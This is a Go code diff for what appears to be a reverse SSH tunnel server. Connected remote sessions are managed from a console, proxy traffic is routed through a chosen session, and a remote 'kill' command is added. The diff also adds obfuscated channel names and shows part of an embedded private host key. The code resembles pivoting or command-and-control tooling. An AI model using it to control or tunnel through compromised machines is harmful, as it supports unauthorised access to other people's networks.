@@ -11,18 +11,28 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
-type Endpoint struct {
+var mutex = &sync.Mutex{}
+
+const (
+	CHAN_FORWARD   = "RbgEySPMPi"
+	CHAN_HEARTBEAT = "uSYeIbUQoR"
+	CHAN_COMMAND   = "rIHqXLCqRN"
+	COMMAND_KILL   = "aAjcDqEIvI"
+)
+
+type Config struct {
 	Host string
 	Port string
 	User string
 	Pwd  string
 }
 
-func (endpoint *Endpoint) String() string {
-	return fmt.Sprintf("%s:%s", endpoint.Host, endpoint.Port)
+func (c *Config) String() string {
+	return fmt.Sprintf("%s:%s", c.Host, c.Port)
 }
 
 type Session struct {
@@ -32,15 +42,15 @@ type Session struct {
 }
 
 type Server struct {
-	SSHServer        *Endpoint
-	ProxyServer      *Endpoint
+	SSHServerConfig        *Config
+	ProxyServerConfig      *Config
 	Sessions         []Session
 	CurrentSessionId int
 	LastSessionId    int
 }
 
 func (s *Server) startProxy() {
-	listener, err := net.Listen("tcp", s.ProxyServer.String())
+	listener, err := net.Listen("tcp", s.ProxyServerConfig.String())
 	if err != nil {
 		panic(1)
 	}
@@ -58,7 +68,7 @@ func (s *Server) startProxy() {
 func (s *Server) startSSHServer() {
 	config := &ssh.ServerConfig{
 		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
-			if c.User() == s.SSHServer.User && string(pass) == s.SSHServer.Pwd {
+			if c.User() == s.SSHServerConfig.User && string(pass) == s.SSHServerConfig.Pwd {
 				return nil, nil
 			}
 			return nil, fmt.Errorf("password rejected for %q, %s", c.User(), c.RemoteAddr())
@@ -98,7 +108,7 @@ E1IkB7PYsNCRMC3d1ODaayj6Oj6w8lGtDqCY5x/hvuaHBHLf1aLod7XpsHXdCvLiOCjqMD
 	}
 	config.AddHostKey(private)
 
-	listener, err := net.Listen("tcp", s.SSHServer.String())
+	listener, err := net.Listen("tcp", s.SSHServerConfig.String())
 	if err != nil {
 		panic("Canot start ssh server")
 	}
@@ -120,11 +130,13 @@ E1IkB7PYsNCRMC3d1ODaayj6Oj6w8lGtDqCY5x/hvuaHBHLf1aLod7XpsHXdCvLiOCjqMD
 			sshConn:      sshConn,
 			Disconnected: false,
 		}
+		mutex.Lock()
 		s.LastSessionId += 1
 		if s.CurrentSessionId == -1 {
 			s.CurrentSessionId = sess.SessionId
 		}
 		s.Sessions = append(s.Sessions, sess)
+		mutex.Unlock()
 		log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())
 		go ssh.DiscardRequests(reqs)
 		go s.keepAlive(sess.SessionId)
@@ -133,8 +145,9 @@ E1IkB7PYsNCRMC3d1ODaayj6Oj6w8lGtDqCY5x/hvuaHBHLf1aLod7XpsHXdCvLiOCjqMD
 }
 
 func (s *Server) keepAlive(id int) {
-	newChan, _, err := s.Sessions[id].sshConn.OpenChannel("heartBeat", []byte(s.SSHServer.String()))
+	newChan, _, err := s.Sessions[id].sshConn.OpenChannel(CHAN_HEARTBEAT, []byte(s.SSHServerConfig.String()))
 	if err != nil {
+		fmt.Println(err.Error())
 		s.Sessions[id].Disconnected = true
 		return
 	}
@@ -142,8 +155,12 @@ func (s *Server) keepAlive(id int) {
 		time.Sleep(10 * time.Second)
 		_, err := newChan.Write([]byte("ping"))
 		if err != nil {
+			mutex.Lock()
 			s.Sessions[id].Disconnected = true
-			s.CurrentSessionId = -1
+			if s.CurrentSessionId == id {
+				s.CurrentSessionId = -1
+			}
+			mutex.Unlock()
 			return
 		}
 	}
@@ -171,10 +188,13 @@ func handleChannel(newChannel ssh.NewChannel) {
 }
 
 func (s *Server) forward(conn net.Conn) {
+	mutex.Lock()
 	if s.CurrentSessionId == -1 {
+		mutex.Unlock()
 		return
 	}
-	newChan, _, err := s.Sessions[s.CurrentSessionId].sshConn.OpenChannel("forward", []byte(s.SSHServer.String()))
+	mutex.Unlock()
+	newChan, _, err := s.Sessions[s.CurrentSessionId].sshConn.OpenChannel(CHAN_FORWARD, []byte(s.SSHServerConfig.String()))
 	if err != nil {
 		return
 	}
@@ -191,24 +211,22 @@ func (s *Server) forward(conn net.Conn) {
 }
 
 func main() {
-	if len(os.Args) != 6 {
-		fmt.Println("Usage: ./server sshAddr sshPort  proxyAddr proxyPort password")
-		fmt.Println("Ex: ./server 0.0.0.0 2222 0.0.0.0 8080 thisrandomkey")
+	if len(os.Args) != 7 {
+		fmt.Println("Usage: ./server sshAddr sshPort  sshUser sshPassword proxyAddr proxyPort")
+		fmt.Println("Ex: ./server.elf 0.0.0.0 2222 userssh passssh 0.0.0.0 8080")
 		return
 	}
 
 	s := Server{
-		SSHServer: &Endpoint{
+		SSHServerConfig: &Config{
 			Host: os.Args[1],
 			Port: os.Args[2],
-			User: "tom",
-			Pwd:  os.Args[5],
+			User: os.Args[3],
+			Pwd:  os.Args[4],
 		},
-		ProxyServer: &Endpoint{
-			Host: os.Args[3],
-			Port: os.Args[4],
-			User: "",
-			Pwd:  "",
+		ProxyServerConfig: &Config{
+			Host: os.Args[5],
+			Port: os.Args[6],
 		},
 		CurrentSessionId: -1,
 		LastSessionId:    -1,
@@ -236,7 +254,9 @@ func main() {
 				table.Append(v)
 			}
 			table.Render()
+			mutex.Lock()
 			fmt.Println("current session: " + strconv.Itoa(s.CurrentSessionId))
+			mutex.Unlock()
 			continue
 		}
 		if cmd[0] == "use" {
@@ -248,6 +268,26 @@ func main() {
 							continue
 						}
 						s.CurrentSessionId = id
+					}
+				}
+			}
+			continue
+		}
+		if cmd[0] == "kill" {
+			if len(cmd) == 2 {
+				if id, err := strconv.Atoi(cmd[1]); err == nil {
+					if id <= s.LastSessionId && id > -1 {
+						if s.Sessions[id].Disconnected {
+							fmt.Println("that session was disconnected")
+							continue
+						}
+						cmdChan, _, err := s.Sessions[id].sshConn.OpenChannel(CHAN_COMMAND, []byte(s.SSHServerConfig.String()))
+						if err == nil {
+							cmdChan.Write([]byte(COMMAND_KILL))
+							//cmdChan.Close()
+						} else {
+							fmt.Println(err.Error())
+						}
 					}
 				}
 			}
